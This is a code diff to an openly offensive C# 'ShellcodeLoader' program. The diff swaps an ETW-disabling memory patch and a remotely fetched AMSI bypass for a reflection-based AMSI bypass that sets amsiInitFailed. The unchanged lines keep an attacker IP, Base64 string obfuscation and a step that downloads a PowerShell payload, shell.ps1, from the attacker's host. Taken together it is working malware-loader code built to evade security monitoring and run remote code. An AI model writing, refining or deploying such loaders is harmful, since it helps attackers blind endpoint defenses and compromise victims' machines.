@@ -10,22 +10,6 @@ namespace ShellcodeLoader
 {
     class Program
     {
-        // Import EtwEventWrite to patch for ETW bypass
-        [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
-        public static extern int EtwEventWrite(IntPtr regHandle, ref EVENT_DESCRIPTOR eventDescriptor, int userDataCount, IntPtr userData);
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct EVENT_DESCRIPTOR
-        {
-            public ushort Id;
-            public byte Version;
-            public byte Channel;
-            public byte Level;
-            public byte Opcode;
-            public ushort Task;
-            public ulong Keyword;
-        }
-
         static void Main(string[] args)
         {
             try
@@ -33,14 +17,8 @@ namespace ShellcodeLoader
                 // <<<<<<<<<<< CHANGE THIS IP BEFORE COMPILING >>>>>>>>>>>
                 string attackerIP = "192.168.1.94";
 
-                Console.WriteLine("[*] Patching ETW to disable telemetry...");
-                PatchETW();
-
-                Console.WriteLine("[*] Executing AMSI bypass...");
-                string amsiPath = Obf("YW1zaS50eHQ="); // "amsi.txt"
-                string amsiUrl = $"http://{attackerIP}/{amsiPath}";
-                string amsiBypass = GetStringFromUrl(amsiUrl);
-                ExecutePowerShell(amsiBypass);
+                Console.WriteLine("[*] Patching AMSI using .NET reflection...");
+                PatchAMSI();
 
                 Console.WriteLine("[*] Downloading PowerShell payload...");
                 string shellPath = Obf("c2hlbGwucHMx"); // "shell.ps1"
@@ -64,7 +42,21 @@ namespace ShellcodeLoader
             }
         }
 
-        // Decodes Base64-encoded strings (used for basic obfuscation)
+        // Patch AMSI using .NET Reflection (amsiInitFailed)
+        static void PatchAMSI()
+        {
+            string amsiType = "System.Management.Automation.AmsiUtils";
+            Type t = Type.GetType(amsiType);
+            if (t == null) return;
+            FieldInfo field = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+            if (field != null)
+            {
+                field.SetValue(null, true);
+                Console.WriteLine("[+] AMSI patched successfully.");
+            }
+        }
+
+        // Base64 decoder for obfuscating static strings
         static string Obf(string base64)
         {
             byte[] data = Convert.FromBase64String(base64);
@@ -82,25 +74,5 @@ namespace ShellcodeLoader
                 return reader.ReadToEnd();
             }
         }
-
-        // Patches EtwEventWrite to immediately return (bypassing ETW logging)
-        static void PatchETW()
-        {
-            IntPtr ntdll = GetModuleHandle("ntdll.dll");
-            IntPtr addr = GetProcAddress(ntdll, "EtwEventWrite");
-            uint oldProtect;
-            VirtualProtect(addr, (UIntPtr)4, 0x40, out oldProtect);
-            Marshal.Copy(new byte[] { 0xC3 }, 0, addr, 1); // ret
-        }
-
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
-        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        [DllImport("kernel32.dll")]
-        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
     }
 }
-
